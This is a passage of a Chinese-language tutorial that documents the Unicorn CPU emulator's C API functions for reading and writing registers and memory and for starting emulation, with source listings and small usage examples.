class="string">"uc实例创建成功"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> r_eax = <span class="number">0x12</span>;</span><br><span class="line">    err = uc_reg_write(uc, UC_X86_REG_ECX, &amp;r_eax);</span><br><span class="line">    <span class="keyword">if</span> (!err)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"写入成功: "</span> &lt;&lt; r_eax &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    err = uc_close(uc);</span><br><span class="line">    <span class="keyword">if</span> (err != UC_ERR_OK) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed on uc_close() with error returned: %u\n"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!err)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"uc实例关闭成功"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出</p><p><img src="https://i.loli.net/2020/01/19/DkztJcigHCdmnRp.png" alt="image.png"></p><h3 id="uc-reg-read"><a href="#uc-reg-read" class="headerlink" title="uc_reg_read"></a>uc_reg_read</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_reg_read</span><span class="params">(uc_engine *uc, <span class="keyword">int</span> regid, <span class="keyword">void</span> *value)</span></span>;</span><br></pre></td></tr></table></figure><p>读取寄存器的值</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@uc: uc_open()返回的句柄</span><br><span class="line">@regid:  将被读取的寄存器ID</span><br><span class="line">@value:  指向保存寄存器值的指针</span><br><span class="line"></span><br><span class="line">@return 成功则返回UC_ERR_OK , 否则返回 uc_err 枚举的其他错误类型</span><br></pre></td></tr></table></figure><p>源码实现</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_reg_read</span><span class="params">(uc_engine *uc, <span class="keyword">int</span> regid, <span class="keyword">void</span> *value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> uc_reg_read_batch(uc, &amp;regid, &amp;value, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">uc_err <span class="title">uc_reg_read_batch</span><span class="params">(uc_engine *uc, <span class="keyword">int</span> *ids, <span class="keyword">void</span> **vals, <span class="keyword">int</span> count)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (uc-&gt;reg_read)</span><br><span class="line">        uc-&gt;reg_read(uc, (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)ids, vals, count);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> UC_ERR_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用示例：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"unicorn/unicorn.h"</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    uc_engine* uc;</span><br><span class="line">    uc_err err;</span><br><span class="line"></span><br><span class="line">    err = uc_open(UC_ARCH_X86, UC_MODE_32, &amp;uc);</span><br><span class="line">    <span class="keyword">if</span> (err != UC_ERR_OK) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed on uc_open() with error returned: %u\n"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!err)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"uc实例创建成功"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> r_eax = <span class="number">0x12</span>;</span><br><span class="line">    err = uc_reg_write(uc, UC_X86_REG_ECX, &amp;r_eax);</span><br><span class="line">    <span class="keyword">if</span> (!err)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"写入成功: "</span> &lt;&lt; r_eax &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> recv_eax;</span><br><span class="line">    err = uc_reg_read(uc, UC_X86_REG_ECX, &amp;recv_eax);</span><br><span class="line">    <span class="keyword">if</span> (!err)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"读取成功: "</span> &lt;&lt; recv_eax &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    err = uc_close(uc);</span><br><span class="line">    <span class="keyword">if</span> (err != UC_ERR_OK) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed on uc_close() with error returned: %u\n"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!err)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"uc实例关闭成功"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出</p><p><img src="https://i.loli.net/2020/01/19/ABkexFCfphu3zIg.png" alt="image.png"></p><h3 id="uc-reg-write-batch"><a href="#uc-reg-write-batch" class="headerlink" title="uc_reg_write_batch"></a>uc_reg_write_batch</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_reg_write_batch</span><span class="params">(uc_engine *uc, <span class="keyword">int</span> *regs, <span class="keyword">void</span> *<span class="keyword">const</span> *vals, <span class="keyword">int</span> count)</span></span>;</span><br></pre></td></tr></table></figure><p>同时将多个值写入多个寄存器</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@uc: uc_open()返回的句柄</span><br><span class="line">@regid:  存储将被写入的多个寄存器ID的数组</span><br><span class="line">@value:  指向保存多个值的数组的指针</span><br><span class="line">@count: *regs 和 *vals 数组的长度</span><br><span class="line"></span><br><span class="line">@return 成功则返回UC_ERR_OK , 否则返回 uc_err 枚举的其他错误类型</span><br></pre></td></tr></table></figure><p>源码实现</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_reg_write_batch</span><span class="params">(uc_engine *uc, <span class="keyword">int</span> *ids, <span class="keyword">void</span> *<span class="keyword">const</span> *vals, <span class="keyword">int</span> count)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = UC_ERR_OK;</span><br><span class="line">    <span class="keyword">if</span> (uc-&gt;reg_write)</span><br><span class="line">        ret = uc-&gt;reg_write(uc, (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)ids, vals, count);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> UC_ERR_EXCEPTION; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用示例：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"unicorn/unicorn.h"</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> syscall_abi[] = &#123;</span><br><span class="line">    UC_X86_REG_RAX, UC_X86_REG_RDI, UC_X86_REG_RSI, UC_X86_REG_RDX,</span><br><span class="line">    UC_X86_REG_R10, UC_X86_REG_R8, UC_X86_REG_R9</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> vals[<span class="number">7</span>] = &#123; <span class="number">200</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span>* ptrs[<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    uc_err err;</span><br><span class="line">    uc_engine* uc;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set up register pointers</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">        ptrs[i] = &amp;vals[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((err = uc_open(UC_ARCH_X86, UC_MODE_64, &amp;uc))) &#123;</span><br><span class="line">        uc_perror(<span class="string">"uc_open"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// reg_write_batch</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"reg_write_batch(&#123;200, 10, 11, 12, 13, 14, 15&#125;)\n"</span>);</span><br><span class="line">    <span class="keyword">if</span> ((err = uc_reg_write_batch(uc, syscall_abi, ptrs, <span class="number">7</span>))) &#123;</span><br><span class="line">        uc_perror(<span class="string">"uc_reg_write_batch"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// reg_read_batch</span></span><br><span class="line">    <span class="built_in">memset</span>(vals, <span class="number">0</span>, <span class="keyword">sizeof</span>(vals));</span><br><span class="line">    <span class="keyword">if</span> ((err = uc_reg_read_batch(uc, syscall_abi, ptrs, <span class="number">7</span>))) &#123;</span><br><span class="line">        uc_perror(<span class="string">"uc_reg_read_batch"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"reg_read_batch = &#123;"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i != <span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">", "</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%"</span> PRIu64, vals[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&#125;\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> var[<span class="number">7</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; syscall_abi[i] &lt;&lt; <span class="string">"   "</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%"</span> PRIu64, vals[i]);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出</p><p><img src="https://i.loli.net/2020/01/19/l1AhdxgKE2U3tZB.png" alt="image.png"></p><h3 id="uc-reg-read-batch"><a href="#uc-reg-read-batch" class="headerlink" title="uc_reg_read_batch"></a>uc_reg_read_batch</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_reg_read_batch</span><span class="params">(uc_engine *uc, <span class="keyword">int</span> *regs, <span class="keyword">void</span> **vals, <span class="keyword">int</span> count)</span></span>;</span><br></pre></td></tr></table></figure><p>同时读取多个寄存器的值。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@uc: uc_open()返回的句柄</span><br><span class="line">@regid:  存储将被读取的多个寄存器ID的数组</span><br><span class="line">@value:  指向保存多个值的数组的指针</span><br><span class="line">@count: *regs 和 *vals 数组的长度</span><br><span class="line"></span><br><span class="line">@return 成功则返回UC_ERR_OK , 否则返回 uc_err 枚举的其他错误类型</span><br></pre></td></tr></table></figure><p>源码实现</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_reg_read_batch</span><span class="params">(uc_engine *uc, <span class="keyword">int</span> *ids, <span class="keyword">void</span> **vals, <span class="keyword">int</span> count)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (uc-&gt;reg_read)</span><br><span class="line">        uc-&gt;reg_read(uc, (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)ids, vals, count);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> UC_ERR_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用示例同uc_reg_write_batch()。</p><h3 id="uc-mem-write"><a href="#uc-mem-write" class="headerlink" title="uc_mem_write"></a>uc_mem_write</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_mem_write</span><span class="params">(uc_engine *uc, <span class="keyword">uint64_t</span> address, <span class="keyword">const</span> <span class="keyword">void</span> *bytes, <span class="keyword">size_t</span> size)</span></span>;</span><br></pre></td></tr></table></figure><p>在内存中写入一段字节码。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> @uc: uc_open() 返回的句柄</span><br><span class="line"> @address: 写入字节的起始地址</span><br><span class="line"> @bytes:   指向一个包含要写入内存的数据的指针</span><br><span class="line"> @size:   要写入的内存大小。</span><br><span class="line"></span><br><span class="line"> 注意: @bytes 必须足够大以包含 @size 字节。</span><br><span class="line"></span><br><span class="line">@return 成功则返回UC_ERR_OK , 否则返回 uc_err 枚举的其他错误类型</span><br></pre></td></tr></table></figure><p>源码实现</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_mem_write</span><span class="params">(uc_engine *uc, <span class="keyword">uint64_t</span> address, <span class="keyword">const</span> <span class="keyword">void</span> *_bytes, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> count = <span class="number">0</span>, len;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint8_t</span> *bytes = _bytes;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (uc-&gt;mem_redirect) &#123;</span><br><span class="line">        address = uc-&gt;mem_redirect(address);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!check_mem_area(uc, address, size))</span><br><span class="line">        <span class="keyword">return</span> UC_ERR_WRITE_UNMAPPED;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 内存区域可以重叠相邻的内存块</span></span><br><span class="line">    <span class="keyword">while</span>(count &lt; size) &#123;</span><br><span class="line">        MemoryRegion *mr = memory_mapping(uc, address);</span><br><span class="line">        <span class="keyword">if</span> (mr) &#123;</span><br><span class="line">            <span class="keyword">uint32_t</span> operms = mr-&gt;perms;</span><br><span class="line">            <span class="keyword">if</span> (!(operms &amp; UC_PROT_WRITE)) <span class="comment">// 没有写保护</span></span><br><span class="line">                <span class="comment">// 标记为可写</span></span><br><span class="line">                uc-&gt;readonly_mem(mr, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">            len = (<span class="keyword">size_t</span>)MIN(size - count, mr-&gt;end - address);</span><br><span class="line">            <span class="keyword">if</span> (uc-&gt;write_mem(&amp;uc-&gt;as, address, bytes, len) == <span class="literal">false</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!(operms &amp; UC_PROT_WRITE)) <span class="comment">// 没有写保护</span></span><br><span class="line">                <span class="comment">// 设置写保护</span></span><br><span class="line">                uc-&gt;readonly_mem(mr, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            count += len;</span><br><span class="line">            address += len;</span><br><span class="line">            bytes += len;</span><br><span class="line">        &#125; <span class="keyword">else</span>  <span class="comment">// 此地址尚未被映射</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (count == size)</span><br><span class="line">        <span class="keyword">return</span> UC_ERR_OK;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> UC_ERR_WRITE_UNMAPPED;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用示例：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"unicorn/unicorn.h"</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> X86_CODE32 <span class="meta-string">"\x41\x4a"</span> <span class="comment">// INC ecx; DEC edx</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ADDRESS 0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    uc_engine* uc;</span><br><span class="line">    uc_err err;</span><br><span class="line"></span><br><span class="line">    err = uc_open(UC_ARCH_X86, UC_MODE_32, &amp;uc);</span><br><span class="line">    <span class="keyword">if</span> (err != UC_ERR_OK) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed on uc_open() with error returned: %u\n"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    uc_mem_map(uc, ADDRESS, <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span>, UC_PROT_ALL);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (uc_mem_write(uc, ADDRESS, X86_CODE32, <span class="keyword">sizeof</span>(X86_CODE32) - <span class="number">1</span>)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed to write emulation code to memory, quit!\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> code;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(uc_mem_read(uc,ADDRESS,&amp;code, <span class="keyword">sizeof</span>(code))) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed to read emulation code to memory, quit!\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; hex &lt;&lt; code &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    err = uc_close(uc);</span><br><span class="line">    <span class="keyword">if</span> (err != UC_ERR_OK) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed on uc_close() with error returned: %u\n"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出</p><p><img src="https://i.loli.net/2020/01/19/l4HhgDzcJIVvFNU.png" alt="image.png"></p><h3 id="uc-mem-read"><a href="#uc-mem-read" class="headerlink" title="uc_mem_read"></a>uc_mem_read</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_mem_read</span><span class="params">(uc_engine *uc, <span class="keyword">uint64_t</span> address, <span class="keyword">void</span> *bytes, <span class="keyword">size_t</span> size)</span></span>;</span><br></pre></td></tr></table></figure><p>从内存中读取字节。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> @uc: uc_open() 返回的句柄</span><br><span class="line"> @address: 读取字节的起始地址</span><br><span class="line"> @bytes:   指向一个包含要读取内存的数据的指针</span><br><span class="line"> @size:   要读取的内存大小。</span><br><span class="line"></span><br><span class="line"> 注意: @bytes 必须足够大以包含 @size 字节。</span><br><span class="line"></span><br><span class="line">@return 成功则返回UC_ERR_OK , 否则返回 uc_err 枚举的其他错误类型</span><br></pre></td></tr></table></figure><p>源码实现</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_mem_read</span><span class="params">(uc_engine *uc, <span class="keyword">uint64_t</span> address, <span class="keyword">void</span> *_bytes, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> count = <span class="number">0</span>, len;</span><br><span class="line">    <span class="keyword">uint8_t</span> *bytes = _bytes;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (uc-&gt;mem_redirect) &#123;</span><br><span class="line">        address = uc-&gt;mem_redirect(address);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!check_mem_area(uc, address, size))</span><br><span class="line">        <span class="keyword">return</span> UC_ERR_READ_UNMAPPED;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 内存区域可以重叠相邻的内存块</span></span><br><span class="line">    <span class="keyword">while</span>(count &lt; size) &#123;</span><br><span class="line">        MemoryRegion *mr = memory_mapping(uc, address);</span><br><span class="line">        <span class="keyword">if</span> (mr) &#123;</span><br><span class="line">            len = (<span class="keyword">size_t</span>)MIN(size - count, mr-&gt;end - address);</span><br><span class="line">            <span class="keyword">if</span> (uc-&gt;read_mem(&amp;uc-&gt;as, address, bytes, len) == <span class="literal">false</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            count += len;</span><br><span class="line">            address += len;</span><br><span class="line">            bytes += len;</span><br><span class="line">        &#125; <span class="keyword">else</span>  <span class="comment">// 此地址尚未被映射</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (count == size)</span><br><span class="line">        <span class="keyword">return</span> UC_ERR_OK;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> UC_ERR_READ_UNMAPPED;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用示例同uc_mem_write()</p><h3 id="uc-emu-start"><a href="#uc-emu-start" class="headerlink" title="uc_emu_start"></a>uc_emu_start</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_emu_start</span><span class="params">(uc_engine *uc, <span class="keyword">uint64_t</span> begin, <span class="keyword">uint64_t</span> until, <span class="keyword">uint64_t</span> timeout, <span class="keyword">size_t</span> count)</span></span>;</span><br></pre></td></tr></table></figure><p>在指定的时间内模拟机器码。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@uc: uc_open() 返回的句柄</span><br><span class="line">@begin: 开始模拟的地址</span><br><span class="line">@until: 模拟停止的地址 (当到达该地址时)</span><br><span class="line">@timeout: 模拟代码的持续时间(以微秒计)。当这个值为0时，将在无限时间内模拟代码，直到代码完成。</span><br><span class="line">@count: 要模拟的指令数。当这个值为0时，将模拟所有可用的代码，直到代码完成</span><br><span class="line"></span><br><span class="line">@return 成功则返回UC_ERR_OK , 否则返回 uc_err 枚举的其他错误类型</span><br></pre></td></tr></table></figure><p>源码实现</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_emu_start</span><span class="params">(uc_engine* uc, <span class="keyword">uint64_t</span> begin, <span class="keyword">uint64_t</span> until, <span class="keyword">uint64_t</span> timeout, <span class="keyword">size_t</span> count)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 重制计数器</span></span><br><span class="line">    uc-&gt;emu_counter = <span class="number">0</span>;</span><br><span class="line">    uc-&gt;invalid_error = UC_ERR_OK;</span><br><span class="line">    uc-&gt;block_full = <span class="literal">false</span>;</span><br><span class="line">    uc-&gt;emulation_done = <span class="literal">false</span>;</span><br><span class="line">    uc-&gt;timed_out = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(uc-&gt;arch) &#123;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_M68K</span></span><br><span class="line">        <span class="keyword">case</span> UC_ARCH_M68K:</span><br><span class="line">            uc_reg_write(uc, UC_M68K_REG_PC, &amp;begin);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_X86</span></span><br><span class="line">        <span class="keyword">case</span> UC_ARCH_X86:</span><br><span class="line">            <span class="keyword">switch</span>(uc-&gt;mode) &#123;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> UC_MODE_16: &#123;</span><br><span class="line">                    <span class="keyword">uint64_t</span> ip;</span><br><span class="line">                    <span class="keyword">uint16_t</span> cs;</span><br><span class="line"></span><br><span class="line">                    uc_reg_read(uc, UC_X86_REG_CS, &amp;cs);</span><br><span class="line">                    <span class="comment">// 抵消后面增加的 IP 和 CS</span></span><br><span class="line">                    ip = begin - cs*<span class="number">16</span>;</span><br><span class="line">                    uc_reg_write(uc, UC_X86_REG_IP, &amp;ip);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">case</span> UC_MODE_32:</span><br><span class="line">                    uc_reg_write(uc, UC_X86_REG_EIP, &amp;begin);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> UC_MODE_64:</span><br><span class="line">                    uc_reg_write(uc, UC_X86_REG_RIP, &amp;begin);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_ARM</span></span><br><span class="line">        <span class="keyword">case</span> UC_ARCH_ARM:</span><br><span class="line">            uc_reg_write(uc, UC_ARM_REG_R15, &amp;begin);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_ARM64</span></span><br><span class="line">        <span class="keyword">case</span> UC_ARCH_ARM64:</span><br><span class="line">            uc_reg_write(uc, UC_ARM64_REG_PC, &amp;begin);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_MIPS</span></span><br><span class="line">        <span class="keyword">case</span> UC_ARCH_MIPS:</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> MIPS32/MIPS64/BIGENDIAN etc</span></span><br><span class="line">            uc_reg_write(uc, UC_MIPS_REG_PC, &amp;begin);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_SPARC</span></span><br><span class="line">        <span class="keyword">case</span> UC_ARCH_SPARC:</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> Sparc/Sparc64</span></span><br><span class="line">            uc_reg_write(uc, UC_SPARC_REG_PC, &amp;begin);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uc-&gt;stop_request = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    uc-&gt;emu_count = count;</span><br><span class="line">    <span class="comment">// 